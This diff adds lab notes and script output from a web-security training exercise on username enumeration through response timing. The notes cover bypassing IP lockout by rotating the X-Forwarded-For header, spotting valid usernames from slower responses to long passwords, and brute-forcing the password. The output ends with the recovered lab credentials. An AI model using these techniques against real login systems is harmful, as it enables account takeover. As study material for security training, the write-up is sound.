@@ -1,0 +1,168 @@
+Lab 05 - Username enumeration via response timing
+
+End goal: Enumerate a valid username and then brute-force the user's password.
+
+Given information:
+- Your credentials: wiener:peter
+- Candidate usernames
+- Candidate passwords
+
+Analysis:
+
+- Attempted a few username/password combinations and analyzed the response time in Burp Repeater
+    - test:test (152 ms)  -> Invalid username or password.
+    - wiener:test (159ms) -> Invalid username or password.
+    - wiener:test (122ms) -> Invalid username or password.
+    - wiener:test (105ms) -> You have made too many incorrect login attempts. Please try again in 30 minute(s).
+    - IP address is locked out after 3 incorrect attempts.
+
+- See if it's using a weak blocking mechanism.
+    - See if it accepts the X-Forwarded-For header, which is the de facto standard header for identifying the originating IP address of a request.
+    - Try "X-Forwarded-For: <IP_ADDRESS>" with username:password and see if we have a new error message.
+    - Also, examine the response time in the Burp Repeater tab.
+        - X-Forwarded-For: 1 
+            (wiener:test -> 250ms)
+            - "1" is not really a valid IP address, but we are just seeing it we can attempt a new login again on a NEW IP address value
+            - it works! We can attempt a login again.
+            - after 3 tries, we'll get logged out again on IP address "1"
+            - so, we'll try a new address
+        - X-Forwarded-For: 2 
+            (wiener:test -> 251ms)
+            - response time is not much different
+            - let's try to login with a longer password...
+            - NOTE: try to increase the password length because for some applications they will check if the username is valid first and if it's not 
+                    valid, they won't check the password.
+                    But if it is valid, they will check the password, and then there might be a time discrepancy between the two.
+        - X-Forwarded-For: 3 
+            (wiener:testtesttesttest -> 316ms)
+        - X-Forwarded-For: 4 
+            (wiener:testtesttesttesttesttesttesttest -> 405ms)
+        - X-Forwarded-For: 5 
+            (wiener:testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttest -> 655ms)
+        - NOTE: So every time the password length is increased, it looks like it's doing more computation in the back end and so it's taking 
+                longer for the application to respond.
+    - Try an invalid username
+        - X-Forwarded-For: 5 
+            (wiener123123:testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttest -> 239ms)
+            - You can see over here it says 239 seconds versus a valid username which was taking over 600 milliseconds.
+            - The reason is because when it's an invalid username, it's not actually checking the password because
+                it sees that it's an invalid username and so there's no use to check the password.
+            - But when it is a valid username, it's checking the password.
+                so this issue in the application allows us to enumerate the list of valid usernames in the application.
+        - Try all the usernames in the usernames list with a LOOOOONG password (in Burp Intruder or Python script) 
+            - all of the invalid usernames will have a short response time
+            - the valid username will have a longer response time, because the backend is validating the password now.
+                - NOTE: If use Burp Intruder, use "Attack type: Pitchfork"
+        - Once you've found the valid username, just iterate through all of the passwords with that username and you are done.
+
+================================================================================================================================================================
+Python script usage and output:
+
+
+┌──(kali㉿kali)-[~/Downloads/Authentication-Vulnerabilities-Labs/lab-05]
+└─$ python3 authentication-lab-05.py "https://0a89002604639d42801b9e2b004f0072.web-security-academy.net"
+[+] Determining the username via enumeration...
+Username: carlos               || Time elapsed: 0.242527
+Username: root                 || Time elapsed: 0.248512
+Username: admin                || Time elapsed: 0.315443
+Username: test                 || Time elapsed: 0.304651
+Username: guest                || Time elapsed: 0.280406
+Username: info                 || Time elapsed: 0.248649
+Username: adm                  || Time elapsed: 0.293775
+Username: mysql                || Time elapsed: 0.268088
+Username: user                 || Time elapsed: 0.279166
+Username: administrator        || Time elapsed: 0.279415
+Username: oracle               || Time elapsed: 0.287361
+Username: ftp                  || Time elapsed: 0.297174
+Username: pi                   || Time elapsed: 0.256447
+Username: puppet               || Time elapsed: 0.293593
+Username: ansible              || Time elapsed: 0.246647
+Username: ec2-user             || Time elapsed: 0.27725
+Username: vagrant              || Time elapsed: 0.28839
+Username: azureuser            || Time elapsed: 0.317422
+Username: academico            || Time elapsed: 0.264076
+Username: acceso               || Time elapsed: 0.298923
+Username: access               || Time elapsed: 0.291386
+Username: accounting           || Time elapsed: 0.240136
+Username: accounts             || Time elapsed: 0.270473
+Username: acid                 || Time elapsed: 0.286667
+Username: activestat           || Time elapsed: 0.228013
+Username: ad                   || Time elapsed: 0.313682
+Username: adam                 || Time elapsed: 0.841342
+Username: adkit                || Time elapsed: 0.232932
+Username: admin                || Time elapsed: 0.249252
+Username: administracion       || Time elapsed: 0.237462
+Username: administrador        || Time elapsed: 0.258938
+Username: administrator        || Time elapsed: 0.26543
+Username: administrators       || Time elapsed: 0.172148
+Username: admins               || Time elapsed: 0.278086
+Username: ads                  || Time elapsed: 0.241807
+Username: adserver             || Time elapsed: 0.263604
+Username: adsl                 || Time elapsed: 0.194982
+Username: ae                   || Time elapsed: 0.267975
+Username: af                   || Time elapsed: 0.228938
+Username: affiliate            || Time elapsed: 0.293801
+Username: affiliates           || Time elapsed: 0.167615
+Username: afiliados            || Time elapsed: 0.279888
+Username: ag                   || Time elapsed: 0.195899
+Username: agenda               || Time elapsed: 0.241419
+Username: agent                || Time elapsed: 0.170127
+Username: ai                   || Time elapsed: 0.29543
+Username: aix                  || Time elapsed: 0.232566
+Username: ajax                 || Time elapsed: 0.272119
+Username: ak                   || Time elapsed: 0.240608
+Username: akamai               || Time elapsed: 0.269392
+Username: al                   || Time elapsed: 0.237928
+Username: alabama              || Time elapsed: 0.18427
+Username: alaska               || Time elapsed: 0.239551
+Username: albuquerque          || Time elapsed: 0.27149
+Username: alerts               || Time elapsed: 0.266519
+Username: alpha                || Time elapsed: 0.246128
+Username: alterwind            || Time elapsed: 0.209656
+Username: am                   || Time elapsed: 0.261707
+Username: amarillo             || Time elapsed: 0.25576
+Username: americas             || Time elapsed: 0.305619
+Username: an                   || Time elapsed: 0.290754
+Username: anaheim              || Time elapsed: 0.249023
+Username: analyzer             || Time elapsed: 0.312315
+Username: announce             || Time elapsed: 0.287215
+Username: announcements        || Time elapsed: 0.286381
+Username: antivirus            || Time elapsed: 0.293702
+Username: ao                   || Time elapsed: 0.312078
+Username: ap                   || Time elapsed: 0.244221
+Username: apache               || Time elapsed: 0.355533
+Username: apollo               || Time elapsed: 0.299366
+Username: app                  || Time elapsed: 0.238953
+Username: app01                || Time elapsed: 0.228561
+Username: app1                 || Time elapsed: 0.236529
+Username: apple                || Time elapsed: 0.242537
+Username: application          || Time elapsed: 0.295037
+Username: applications         || Time elapsed: 0.242462
+Username: apps                 || Time elapsed: 0.208832
+Username: appserver            || Time elapsed: 0.207676
+Username: aq                   || Time elapsed: 0.275129
+Username: ar                   || Time elapsed: 0.234113
+Username: archie               || Time elapsed: 0.244045
+Username: arcsight             || Time elapsed: 0.20182
+Username: argentina            || Time elapsed: 0.290321
+Username: arizona              || Time elapsed: 0.280596
+Username: arkansas             || Time elapsed: 0.274693
+Username: arlington            || Time elapsed: 0.29351
+Username: as                   || Time elapsed: 0.257946
+Username: as400                || Time elapsed: 0.274382
+Username: asia                 || Time elapsed: 0.239768
+Username: asterix              || Time elapsed: 0.206944
+Username: at                   || Time elapsed: 0.245779
+Username: athena               || Time elapsed: 0.272061
+Username: atlanta              || Time elapsed: 0.239871
+Username: atlas                || Time elapsed: 0.204481
+Username: att                  || Time elapsed: 0.248373
+Username: au                   || Time elapsed: 0.254364
+Username: auction              || Time elapsed: 0.240696
+Username: austin               || Time elapsed: 0.199955
+Username: auth                 || Time elapsed: 0.29066
+Username: auto                 || Time elapsed: 0.22543
+Username: autodiscover         || Time elapsed: 0.289097
+[+] Found username succesfully: adam
+[+] Determining the password via enumeration...
+[+] Found password succesfully: tigger
